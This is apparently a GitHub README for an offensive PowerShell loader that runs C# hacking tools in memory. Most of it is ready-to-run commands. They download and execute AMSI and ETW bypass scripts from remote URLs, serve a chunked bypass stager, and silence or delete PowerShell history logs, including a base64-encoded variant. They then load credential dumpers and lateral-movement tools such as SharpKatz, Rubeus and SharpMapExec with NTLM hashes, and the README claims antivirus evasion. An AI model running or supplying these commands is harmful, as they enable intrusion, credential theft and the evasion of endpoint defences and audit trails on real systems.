# PowerShell exec-assembly remote loader

## There is a very useful tool to wrap CSharp assemlby tools within PowerShell can be loaded remotely:

https://github.com/S3cur3Th1sSh1t/PowerSharpPack

## However, sometimes I will need to load some uncommon CSharp tools, this one is used to load CSharp assembly EXE directly in memory (fileless). it will provide a better AV bypass (need AMSI bypass first)

## Regarding to AMSI bypass, must read these first:
https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell


## A golang version AMSI bypass using direct syscalls (improved and much more chance to be success)
https://github.com/timwhitez/Doge-AMSI-patch//

A compiled version `dogeamsi.exe` is included in this repo for convinence. 
This one is tested to bypass [*sophos AMSI protection*](https://news.sophos.com/en-us/2021/06/02/amsi-bypasses-remain-tricks-of-the-malware-trade/) successfully.

## To bring back a detected AMSI bypass script alive:
https://github.com/icyguider/PowerChunker

Run the following command to generate amsibypass stager and host it:
```
┌──(root💀TW-PenTestBox)-[/opt/PowerChunker]
└─# ./PowerChunker.py bypass.ps1 10.0.0.186 --serve

/\     __    PowerChunker.py!!!            
  \ .-':::.         (by @icyguider)                       
   \ :::::|\                              
  |,\:::'/  \     why is there hamburger? 
  `.:::-'    \                             
    `-.       \         ___                
       `-.     |     .-'';:::.              
          `-.-'     / ',''.;;;\            
                   |  ','','.''|            
              AsH  |\  ' ,',' /'           
                   `.`-.___.-;'             
                     `--._.-'                                                           

[+] Powershell script has been split into 10 files...
[!] PowerChunker Stager written to: chunker.ps1
    Execute like so: iex (iwr -UseBasicParsing http://10.0.0.186/chunker.ps1)

┌──(root💀TW-PenTestBox)-[/opt/PowerChunker]
└─# python3 -m http.server 80
```

## To block writes history log
```
# Neuter Writes to History Log:
Set-PSReadlineOption -HistorySaveStyle SaveNothing

# Encoded version of blocking writes to history
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UwBlAHQALQBQAFMAUgBlAGEAZABsAGkAbgBlAE8AcAB0AGkAbwBuACAALQBIAGkAcwB0AG8AcgB5AFMAYQB2AGUAUwB0AHkAbABlACAAUwBhAHYAZQBOAG8AdABoAGkAbgBnAA==')) | IEX

# Delete history logs
rm (Get-PSReadlineOption).HistorySavePath
```

Ref:
[1] https://gist.github.com/reigningshells/a255fcca07465befbcbf4be9cdf67560


### Usage:

```
## ETW bypass and AMSI bypass all-in-one, sometimes amsi3.txt been detected and blocked
IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi3.txt"));
IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/etw.txt"));
IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssembly.ps1"));

## If amsi3.txt has been blocked, then try the following AMSI bypass 
IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi1_1.txt"));
IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi2.txt"));
IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/etw.txt"));
IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssembly.ps1"));


## Load SharpKatz
Invoke-LoadAssembly -AssemblyUrl http://10.10.10.128:81/SharpKatz.exe -Command "msv"
Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/SharpKatz.exe?raw=true -Command "msv"
Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/SharpKatz.exe?raw=true -Command "logonpassword"

## Load winPEAS
Invoke-LoadAssembly -AssemblyUrl http://10.10.10.128:81/winPEAS.exe -Command "notcolor quiet log"
Invoke-LoadAssembly -AssemblyUrl https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/Dotfuscated/any/winPEASany.exe?raw=true -Command "notcolor quiet"

## Load Rubeus
Invoke-LoadAssembly -AssemblyUrl http://10.10.10.128:81/Rubeus.exe -Command "hash /password:test"
Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Rubeus.exe?raw=true -Command "hash /password:test"
Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/Rubeus.exe?raw=true -Command "hash /password:test"

## Load SharpEDRChecker
Invoke-LoadAssembly -AssemblyUrl http://10.0.0.144:8000/SharpEDRChecker.exe -Command ""
Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/SharpEDRChecker.exe?raw=true

## Load SauronEye
Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/SauronEye.exe?raw=true -Command "--directories c:\ --filetypes .txt -contents --keywords password pass*"

## Load Certify
Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Certify.exe?raw=true -Command "find /vulnerable"

## Load EDD
Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/EDD.exe?raw=true -Command "-h"
Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/EDD_any.exe?raw=true -Command "-h"


### After fix the reflectedType is not public issue (Defender not detected):
## Load SharpUp
Invoke-LoadAssembly -AssemblyUrl http://10.10.10.128:81/SharpUpNew.exe -Command "audit"
Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/SharpUp.exe?raw=true -Command "audit"

## Load Seatbelt
Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/Seatbelt.exe?raw=true -Command "-group=user -outputfile=C:\\Temp\\out.txt"
Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/Seatbelt.exe?raw=true -Command "-group=all -full -outputfile=C:\Temp\out.txt"

## Load SharpLAPS
Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/SharpLAPS.exe?raw=true -Command "-h"

## Load SharpMapExec
Invoke-LoadAssembly -AssemblyUrl http://10.0.0.144:81/SharpMapExec.exe -Command "ntlm smb /user:USER /ntlm:HASH /domain:DOMAIN /computername:TARGET"
Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/SharpMapExec.exe?raw=true -Command "ntlm smb /user:USER /ntlm:HASH /domain:DOMAIN /computername:TARGET"

## Load SharpShares
Invoke-LoadAssembly -AssemblyUrl http://10.0.0.144:81/SharpShares.exe -Command "-h"
Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/SharpShares.exe?raw=true -Command "-h"

```